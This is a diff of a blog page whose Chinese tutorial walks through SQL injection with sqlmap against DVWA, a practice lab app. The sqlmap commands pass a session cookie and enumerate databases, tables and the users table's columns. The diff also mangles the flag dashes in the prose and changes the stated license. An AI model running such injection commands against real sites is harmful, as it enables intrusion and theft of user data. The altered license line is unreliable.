@@ -132,7 +132,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -194,7 +194,6 @@
         <div class="post-content" id="post-content" itemprop="postContent">
             <p>利用sqlmap对dvwa进行注入。</p>
 <a id="more"></a>
-
 <p>kali自带sqlmap，在主机安装DVWA</p>
 <p>DVWA的安装：</p>
 <p><a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a></p>
@@ -207,12 +206,10 @@
                 </div>
                 <div class="image-caption">LBPT_7ZN9O_Z6Z_9_9_GJCN.png</div>
             </figure>
-
 <p>在kali上上启动sqlmap，由于我是虚拟机上运行的sqlmap，只需要将localhost换成主机IP即可</p>
 <p>开始注入url:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"</span></span><br></pre></td></tr></table></figure>
-
-<p>由于这个注入页面需要登陆，所以还得加上cookie(chrome下cookie导出工具editthiscookie),过程中会不断让输入Y/N，可以加上参数–batch，来自动填写默认值。</p>
+<p>由于这个注入页面需要登陆，所以还得加上cookie(chrome下cookie导出工具editthiscookie),过程中会不断让输入Y/N，可以加上参数—batch，来自动填写默认值。</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -220,11 +217,9 @@
                 </div>
                 <div class="image-caption">_GCJPZ3_5T3T97_6K37__QN.png</div>
             </figure>
-
 <p>得到数据库类型版本信息(mysql)，服务器类型版本信息(apache，php)</p>
-<p>用–dbs查看数据库名</p>
+<p>用—dbs查看数据库名</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"</span> --batch --dbs</span><br></pre></td></tr></table></figure>
-
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -232,11 +227,9 @@
                 </div>
                 <div class="image-caption">7QU2_IR5VYECTF~_V~QPQ_6.png</div>
             </figure>
-
 <p>得到6个数据库名</p>
-<p>用–D xxx查看指定数据库，–tables查看数据库中表信息</p>
+<p>用—D xxx查看指定数据库，—tables查看数据库中表信息</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"</span> --batch -D dvwa --tables</span><br></pre></td></tr></table></figure>
-
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -244,11 +237,9 @@
                 </div>
                 <div class="image-caption">__O`CQDEB_3S_A_WIYRY089.png</div>
             </figure>
-
 <p>得到了数据库dvwa的所有表名</p>
-<p>用–T xxx查看指定表，–columns查看表的列信息</p>
+<p>用—T xxx查看指定表，—columns查看表的列信息</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"</span> --batch -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>
-
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -256,7 +247,6 @@
                 </div>
                 <div class="image-caption">_K_TD7~IC_AW_D_~656GBNQ.png</div>
             </figure>
-
 <p>得到了数据库dvwa中表users的数据信息</p>
 <p>注入成功！</p>
 
@@ -267,7 +257,7 @@
     <div class="content">
         
 <span class="post-time">
-    最終更新：<time datetime="2019-11-09T07:44:17.016Z" itemprop="dateUpdated">2019-11-09 15:44:17</time>
+    Last updated: <time datetime="2019-11-09T07:44:17.016Z" itemprop="dateUpdated">2019-11-09 15:44:17</time>
 </span><br>
 
 
@@ -440,7 +430,7 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>このブログの内容物は<a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+            <span>This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
